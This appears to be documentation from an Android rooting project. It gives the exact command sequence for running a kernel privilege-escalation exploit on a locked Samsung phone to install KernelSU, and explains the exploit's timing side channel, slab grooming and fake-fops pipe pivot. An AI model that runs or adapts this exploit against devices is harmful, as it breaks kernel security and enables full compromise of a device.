# 02, Root and the reboot cycle

## The exact sequence that works

This is the whole thing. Everything else is packaging around it.

```sh
cd /data/local/tmp

# 1. the exploit (launcher -> payload). ABSOLUTE PATHS ARE REQUIRED.
./stability-launcher --payload /data/local/tmp/ksu-payload \
 --helper /data/local/tmp/ksu-helper \
 --mm-factory /data/local/tmp/mm-exec-factory \
 > bope.log 2>&1 &

# 2. wait for "Root achieved" in bope.log

# 3. THE STEP THAT INSTALLS su (the flag, not a path)
./ksu-helper --late-load

# 4. verify
su -c id # -> uid=0(root) context=u:r:ksu:s0
```

### Two ways to get this wrong (both cost hours)

- **`ku-helper` vs `ksu-helper`.** A one-letter typo makes every call fail with
 `exit=127`.
- **`ksu-helper <ksud> late-load` does nothing.** The correct form is the **flag**:
 `ksu-helper --late-load`. It prints
 `KernelSU control verified version=33294 flags=0x5 uapi=4 features=0x2714`
 when it works.
- **Relative paths break the preflight.** `--helper ./ksu-helper` produces
 `[preflight] invalid root helper errno=0`. `errno=0` is the clue: no syscall
 failed, the launcher simply never exported `CVE43499_ROOT_HELPER`.

## Why root cannot survive a reboot

The exploit gains a temporary kernel read/write primitive, installs `su`, and that is
all RAM. There is no persistence path because the bootloader is locked, nothing in
the boot chain can be modified. **Every reboot starts from zero root.**

The design response is not to fight this but to automate it, which is what the
AutoRoot app does (see `docs/03-autoroot-app.md`).

## The thermal gate, why the phone must be cold

The exploit's own gate specification:

```
gate fzi1-fresh: 3 amostras/2s (fast 2/1s)
 temp<=48C mem>=1GB tarefas<=8 PSI<=25/3/5
 uptime>=60s mm<=2048/48 mm-delta<=64 pipe=480x32 timeout=300s
```

It needs **3 consecutive clean samples** before it will run.

### Why heat breaks it

1. **Clock speed is a function of temperature.** The SoC's thermal zones run the
 `step_wise` governor:
 ```
 cpuss-0 policy: step_wise
 cpu-1-5 policy: step_wise
 ```
 `step_wise` steps frequencies down as temperature rises. The exploit measures
 **time**, futex PI triggering, an MM-address leak via a timing sidechannel
 (`03_mm_address_sidechannel/counter_timing.h`), and pipe timing, so a changing
 clock invalidates its calibration.

2. **The exploit checks for exactly that.** Its own log:
 ```
 [groom] cpu selected=3 capacity=811 max_freq_khz=2803200 core_ctl_known=1 paused=0 not_preferred=0
 ```
 It records `core_ctl_known`, `paused`, `not_preferred`, it is asking "is this core
 parked or throttled?" Samsung's `core_ctl` parks/offlines cores when hot, and the
 exploit pins to one CPU while probing others.

3. **Memory must stay still.** The slab groom (`mm leaked=…`, `drain-reclaim-done`)
 has to survive without intervening allocations. Hence `mem>=1GB`, `mm<=2048/48`,
 `mm-delta<=64`, those measure churn, not just free memory.

4. **It is a safety gate, not a speed knob.** The exploit corrupts a fake `fops` on
 the ashmem misc device and pivots through a corrupt pipe buffer for arbitrary
 read/write. Partial landings happen (`[immediate] fake fops owner clear=1` is a
 cleanup path), and a half-applied mutation is worse than a clean failure:
 ```
 [BOPE] stage=kernel-mutation-pending state=2
 ```
 After a failed hot attempt, a **reboot is required before retrying**.

### Measured evidence

| Device state | Result |
|---|---|
| 48.9 -> 52.9 -> 64.9 °C | `gate=0/3`, never reached quorum |
| **37.0 °C** | quorum in ~2 s -> `Root achieved in 3 seconds`, `attempt=1/3`, first try |
| After a reboot, 90 °C | waited, then opened by itself once cooled -> succeeded first try |

**Practical meaning:** root returning 30-90 s after a reboot is normal. Seeing
`gate waiting ... temp=XXC` means it is working correctly. Do not force it.

## Payloads and where they come from

Staged from the app's own APK into `/data/local/tmp`:

| Asset in APK | Destination | Size |
|---|---|---|
| `stability-launcher-fzi1` | `stability-launcher` | 17,952 |
| `cve-2026-43499-root-fzi1` | `ksu-helper` | 26,560 |
| `cve-2026-43499-app-fzi1.so` | `ksu-payload` | 171,600 |
| `mm-exec-factory-fzi1` | `mm-exec-factory` | 1,816 |
| `ksud-next-v3.4.0-fzi1` | `ksud-selected` and `.ksud-stage` | 4,290,936 |

Extraction is done by unzipping the APK from shell context, which is why assets can
live there at all (an app cannot write `/data/local/tmp` itself).

The upstream source is `soumarcelino/Root-My-Galaxy-SM-S918B`,
`targets/fzi1-WIP/`. Its own notes admit that "169 allocator, reclaim, and timing
calibration values remain inherited from FZH3 and require physical-device
validation", worth knowing when a future firmware update moves the kernel around.

## What the KernelSU internals look like

```
$ su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ grep -i kernelsu /proc/modules
kernelsu 303104 1 - Live 0x0000000000000000 (OE)

$ /data/adb/ksud --version
ksud 3.4.0 (uapi: 4)
```

The user-service context for our app comes out as `uid=2000` (**shell**) on a fresh
boot, which is exactly what the exploit needs.

The allowlist lives at `/data/adb/ksu/.allowlist` (private binary format: header
`USK\x7f`, **784-byte records**, uid as little-endian at record offset +256).
`ksud` has **no** command to manage it. Do not hand-edit it, a bad write breaks root
for every existing entry.
